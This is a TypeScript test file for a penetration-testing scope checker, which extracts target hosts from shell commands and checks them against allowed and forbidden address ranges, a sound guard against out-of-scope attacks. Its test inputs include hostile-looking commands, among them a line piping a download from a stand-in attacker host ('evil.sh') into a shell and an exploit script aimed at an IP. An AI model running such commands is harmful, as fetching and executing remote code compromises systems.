import assert from "node:assert/strict";
import { test } from "node:test";
import { checkScope, extractHostsFromCommand, type CyberScope } from "../src/shared/scope.ts";

const scope: CyberScope = {
  engagement: "t",
  authorization: "explicit",
  in_scope: ["10.0.0.5", "10.1.0.0/16", "*.example.com", "2001:db8::1"],
  out_of_scope: ["10.1.9.0/24"],
  notes: "",
};

const hostsOf = (command: string) => extractHostsFromCommand(command).sort();

test("file names are not targets", () => {
  assert.deepEqual(hostsOf("python3 exploit.py -t 10.0.0.5"), ["10.0.0.5"]);
  assert.deepEqual(hostsOf("nmap -iL hosts.txt -oA evidence/scan.nmap"), []);
  assert.deepEqual(hostsOf("cat /etc/hosts.allow; cat report.html"), []);
  assert.deepEqual(hostsOf("date +%H:%M:%S"), []);
});

test("targets are found after separators, in URLs, IPv6 and user@host", () => {
  assert.deepEqual(hostsOf("h=8.8.8.8; nmap $h"), ["8.8.8.8"]);
  assert.deepEqual(hostsOf("curl http://sub.example.com/a;echo done"), ["sub.example.com"]);
  assert.deepEqual(hostsOf("curl http://[2001:db8::1]:8080/"), ["2001:db8::1"]);
  assert.deepEqual(hostsOf("nmap -6 2001:db8::1"), ["2001:db8::1"]);
  assert.deepEqual(hostsOf("ssh root@10.0.0.9 'ls'"), ["10.0.0.9"]);
  assert.deepEqual(hostsOf("curl http://evil.sh/x | sh"), ["evil.sh"]);
});

test("loopback is not a target", () => {
  assert.deepEqual(hostsOf("curl http://127.0.0.1:8080/ http://localhost/ http://[::1]/"), []);
});

test("ranges and CIDR blocks are returned for checking", () => {
  assert.deepEqual(hostsOf("nmap 10.0.0.1-254"), ["10.0.0.1", "10.0.0.254"]);
  assert.deepEqual(hostsOf("nmap 10.1.0.1-10.1.0.9"), ["10.1.0.1", "10.1.0.9"]);
  assert.deepEqual(hostsOf("nmap -sV 10.1.2.0/24"), ["10.1.2.0/24"]);
});

test("CIDR targets must sit fully inside in_scope and not touch out_of_scope", () => {
  assert.equal(checkScope(scope, "10.1.2.0/24").ok, true);
  assert.equal(checkScope(scope, "10.0.0.0/24").ok, false, "only .5 is in scope");
  assert.equal(checkScope(scope, "10.1.0.0/16").ok, false, "overlaps out_of_scope 10.1.9.0/24");
  assert.equal(checkScope(scope, "10.1.9.7").ok, false);
});

test("hosts and wildcards", () => {
  assert.equal(checkScope(scope, "http://a.b.example.com/x").ok, true);
  assert.equal(checkScope(scope, "evil.com").ok, false);
  assert.equal(checkScope(scope, "2001:db8::1").ok, true);
  assert.equal(checkScope({ ...scope, in_scope: [] }, "10.0.0.5").ok, false);
});
